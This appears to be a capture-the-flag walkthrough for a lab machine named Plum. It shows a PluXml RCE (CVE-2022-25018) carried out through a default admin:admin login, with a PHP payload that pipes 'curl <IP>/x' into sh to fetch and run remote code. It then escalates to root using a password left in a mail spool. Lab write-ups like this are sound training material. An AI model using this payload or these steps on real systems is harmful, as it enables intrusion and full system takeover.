_____
# Walkthrough for Plum

# Enumeration

## Nmap

With nmap scan, we notice a web server on the target machine.

Visiting the web page, we are presented with "**PluXml**" landing static page.

## PluXml

> is a blog / CMS that uses XML instead of an SQL database to store its data.

# Exploitation

## Remote Code Execution

We find **"[CVE-2022-25018](https://nvd.nist.gov/vuln/detail/CVE-2022-25018)"** recorded for **PluXml**.

The exploitation steps can be found here: https://github.com/MoritzHuppert/CVE-2022-25018/blob/main/CVE-2022-25018.pdf

**Reference**: https://nvd.nist.gov/vuln/detail/CVE-2022-25018

#### Description: CVE-2022-25018

Pluxml v5.8.7 was discovered to allow attackers to execute arbitrary code via crafted PHP code inserted into static pages.

## POC

Visit webserver and find the link highlighted as administration.

Web server is protected by a weak password. Credentia below

```bash
admin:admin
```

Visit "**Static pages**" then click on "**edit**" to edit the static page

Erase all the content of the page and put your malicious php payload.

```php
<?php
   system("curl <IP>/x |sh");
?>
```

Save the page, And click on action "**see**"

You should get code execution

# Privilege Escalation

After some enumeration, we find a mail that has the credential for root user.

```
$ cd /var/mail
$ ls -alh
total 12K
drwxrwsr-x  2 root     mail 4.0K Aug 25 06:31 .
drwxr-xr-x 12 root     root 4.0K Aug 25 05:57 ..
-rw-rw----  1 www-data mail  746 Aug 25 06:31 www-data
```

```
$cat www-data
From root@localhost Fri Aug 25 06:31:47 2023
Return-path: <root@localhost>
Envelope-to: www-data@localhost
Delivery-date: Fri, 25 Aug 2023 06:31:47 -0400
Received: from root by localhost with local (Exim 4.94.2)
	(envelope-from <root@localhost>)
	id 1qZU6V-0000El-Pw
	for www-data@localhost; Fri, 25 Aug 2023 06:31:47 -0400
To: www-data@localhost
From: root@localhost
Subject: URGENT - DDOS ATTACK"
Reply-to: root@localhost
Message-Id: <E1qZU6V-0000El-Pw@localhost>
Date: Fri, 25 Aug 2023 06:31:47 -0400

We are under attack. We've been targeted by an extremely complicated and sophisicated DDOS attack. I trust your skills. Please save us from this. Here are the credentials for the root user:
root:6s8kaZZNaZZYBMfh2YEW
Thanks,
Administrator
```

```
$ su root
Password: 6s8kaZZNaZZYBMfh2YEW
id
uid=0(root) gid=0(root) groups=0(root)
```
